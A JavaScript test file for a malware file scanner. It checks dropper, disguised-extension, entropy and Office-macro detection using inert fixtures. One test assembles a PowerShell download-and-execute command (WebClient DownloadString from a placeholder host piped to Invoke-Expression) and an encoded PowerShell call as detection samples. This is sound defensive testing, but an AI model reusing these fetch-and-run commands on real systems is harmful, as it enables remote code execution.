'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { scanFile } = require('../server/lib/scan/filescan');

const analyze = (buffer) => scanFile(buffer, 'inert-fixture.exe', { lookupHash: () => null });

// Command words are assembled from pieces, so no finished command sits in this file or on a command line.
const j = (...parts) => parts.join('');
const f08 = (name, text) => scanFile(Buffer.from(text), name, { lookupHash: () => null }).checks.find((c) => c.id === 'F08');

test('a script that only runs commands is not a dropper; one that fetches and runs still is', () => {
  const shell = j('WScript', '.Shell');
  const iex = j('Invoke', '-Expression');
  const fetch = j('Net', '.Web', 'Client).Down', 'loadString("http://example.invalid/a")');
  assert.equal(f08('admin.vbs', `Set s = CreateObject("${shell}")`).status, 'warn', 'Windows admin scripts do this');
  assert.equal(f08('admin.ps1', `${iex} $cmd`).status, 'warn');
  assert.equal(f08('get.ps1', `(New-Object ${fetch} | ${iex}`).status, 'fail');
  assert.equal(f08('run.bat', j('power', 'shell -', 'enc SQBFAFgA')).status, 'fail', 'encoded PowerShell fetches and runs in one');
});

test('a library named with dots is not a disguised document; a program behind a document name is', () => {
  const f05 = (name) => scanFile(Buffer.from('MZ inert'), name, { lookupHash: () => null }).checks.find((c) => c.id === 'F05').status;
  assert.equal(f05('Windows.Data.Pdf.dll'), 'pass');
  assert.equal(f05('invoice.pdf.exe'), 'fail');
  assert.equal(f05('invoice.pdf.zip'), 'fail');
});
const entropyCheck = (buffer) => analyze(buffer).checks.find((check) => check.id === 'F06');

test('file entropy keeps the packed-file warning for a uniform byte distribution', () => {
  // Only an MZ marker and synthetic bytes; this is not an executable program.
  const pattern = Buffer.from(Array.from({ length: 256 }, (_, i) => i));
  const buffer = Buffer.alloc(1024 * 1024, pattern);
  buffer.write('MZ');
  const check = entropyCheck(buffer);
  assert.equal(check.status, 'warn');
  assert.equal(check.points, 14);
  assert.match(check.detail, /8\.00 bits\/byte/);
});

test('file entropy keeps low-entropy files clear and samples only the first 4 MiB', () => {
  const prefix = Buffer.alloc(4 * 1024 * 1024);
  prefix.write('MZ');
  const pattern = Buffer.from(Array.from({ length: 256 }, (_, i) => i));
  const withTail = Buffer.concat([prefix, Buffer.alloc(6 * 1024 * 1024, pattern)]);
  const check = entropyCheck(prefix);
  assert.equal(check.status, 'pass');
  assert.equal(check.detail, 'Entropy 0.00');
  assert.deepEqual(entropyCheck(withTail), check, 'bytes beyond the entropy sample do not change the warning');
});

test('Office macro checks still distinguish auto-running and ordinary macros', () => {
  const header = Buffer.from('d0cf11e0a1b11ae1', 'hex');
  const macroCheck = (text) => scanFile(Buffer.concat([header, Buffer.from(text)]), 'inert-fixture.doc', {
    lookupHash: () => null
  }).checks.find((check) => check.id === 'F09');
  assert.equal(macroCheck('_VBA_PROJECT inert text Document_Open').points, 55);
  assert.equal(macroCheck('_VBA_PROJECT inert text ordinary macro').points, 36);
  assert.equal(macroCheck('Document_Open without any macro marker').status, 'pass');
});
